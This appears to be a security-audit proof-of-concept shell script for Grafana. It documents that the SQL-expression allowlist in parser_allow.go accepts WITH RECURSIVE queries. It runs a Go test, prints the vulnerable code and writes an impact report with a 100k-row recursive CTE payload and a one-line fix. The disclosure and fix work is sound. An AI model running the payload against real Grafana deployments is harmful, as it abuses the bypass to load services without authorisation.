#!/usr/bin/env bash
# PoC: WITH RECURSIVE allowlist bypass in pkg/expr/sql/parser_allow.go
#
# Finding:   M9 - with-recursive-allowlist-bypass
# Severity:  MEDIUM
# Component: pkg/expr/sql/parser_allow.go:170-171
#
# Root cause:
#   allowedNode() matches *sqlparser.With unconditionally at line 170 and
#   returns true without reading the Recursive bool field. AllowQuery returns
#   (true, nil) for any WITH RECURSIVE query, enabling authenticated users to
#   generate up to 100k rows purely in-engine with zero datasource input.
#
# Usage:
#   bash archon/findings/M9-with-recursive-allowlist-bypass/evidence/poc.sh
#
# The Go PoC test lives at:
#   pkg/expr/sql/m9_poc_test.go
# and is run directly here.

set -euo pipefail

REPO="/Users/bytedance/Desktop/oss-to-run/grafana"
EVIDENCE_DIR="${REPO}/archon/findings/M9-with-recursive-allowlist-bypass/evidence"
mkdir -p "${EVIDENCE_DIR}"

{
echo "=== M9 WITH RECURSIVE allowlist bypass PoC ==="
echo "Date: $(date -u)"
echo ""
echo "Running test: TestM9_WithRecursiveAllowlistBypass"
echo "Test file:    pkg/expr/sql/m9_poc_test.go"
echo ""
} | tee "${EVIDENCE_DIR}/exploit.log"

# ── Run the three-step Go PoC test ──────────────────────────────────────────
cd "${REPO}"
go test -v -count=1 -run TestM9_WithRecursiveAllowlistBypass \
    ./pkg/expr/sql/ 2>&1 | tee -a "${EVIDENCE_DIR}/exploit.log"

echo "" | tee -a "${EVIDENCE_DIR}/exploit.log"
echo "=== Verifying root cause: parser_allow.go:170-171 ===" | tee -a "${EVIDENCE_DIR}/exploit.log"

# ── Print the vulnerable code ────────────────────────────────────────────────
echo "[*] Vulnerable switch branch (parser_allow.go:168-172):" | tee -a "${EVIDENCE_DIR}/exploit.log"
sed -n '168,173p' "${REPO}/pkg/expr/sql/parser_allow.go" | tee -a "${EVIDENCE_DIR}/exploit.log"

echo "" | tee -a "${EVIDENCE_DIR}/exploit.log"
echo "[*] vitess With struct — Recursive is a plain bool, not an AST child node:" \
    | tee -a "${EVIDENCE_DIR}/exploit.log"
grep -A 4 "type With struct" \
    /Users/bytedance/go/pkg/mod/github.com/dolthub/vitess@*/go/vt/sqlparser/ast.go \
    2>/dev/null | head -5 | tee -a "${EVIDENCE_DIR}/exploit.log"

echo "" | tee -a "${EVIDENCE_DIR}/exploit.log"
echo "[*] With.walkSubtree — Recursive bool is never walked:" | tee -a "${EVIDENCE_DIR}/exploit.log"
grep -A 12 "func (w \*With) walkSubtree" \
    /Users/bytedance/go/pkg/mod/github.com/dolthub/vitess@*/go/vt/sqlparser/ast.go \
    2>/dev/null | head -13 | tee -a "${EVIDENCE_DIR}/exploit.log"

# ── Write impact summary ─────────────────────────────────────────────────────
cat > "${EVIDENCE_DIR}/impact.log" <<'EOF'
FINDING:  M9 - WITH RECURSIVE allowlist bypass
SEVERITY: MEDIUM
STATUS:   executed

SECURITY EFFECT:
  AllowQuery() in pkg/expr/sql/parser_allow.go returns (true, nil) for any
  WITH RECURSIVE query.  allowedNode() at line 170 matches *sqlparser.With
  and returns true unconditionally.  The Recursive bool field exists on the
  struct but is never read by allowedNode().

ATTACKER POSITION:
  Any authenticated Grafana user who can create or edit a panel that uses a
  SQL expression (feature flag sqlExpressions, public preview in Grafana 11.x).

CONCRETE IMPACT (proven by test):
  Step 1 — AllowQuery("poc", payloadMax) = (true, nil) for 100k-row recursive CTE
  Step 2 — allowedNode(&With{Recursive:true}) = true; Recursive is never read
  Step 3 — DB.QueryFrames executes 100 rows from 0 input frames in ~2ms
            (same path scales to 100 000 rows within the output cell cap)

PAYLOAD:
  WITH RECURSIVE counter(n) AS (
      SELECT 1
      UNION ALL
      SELECT n+1 FROM counter WHERE n < 100000
  ) SELECT n, n*n AS square FROM counter

ONE-LINE FIX (parser_allow.go:170):
  Before:  case *sqlparser.With:
               return
  After:   case *sqlparser.With:
               return !v.Recursive
EOF

echo "[*] Impact summary written to evidence/impact.log" | tee -a "${EVIDENCE_DIR}/exploit.log"
echo "" | tee -a "${EVIDENCE_DIR}/exploit.log"
echo "=== PoC complete ===" | tee -a "${EVIDENCE_DIR}/exploit.log"
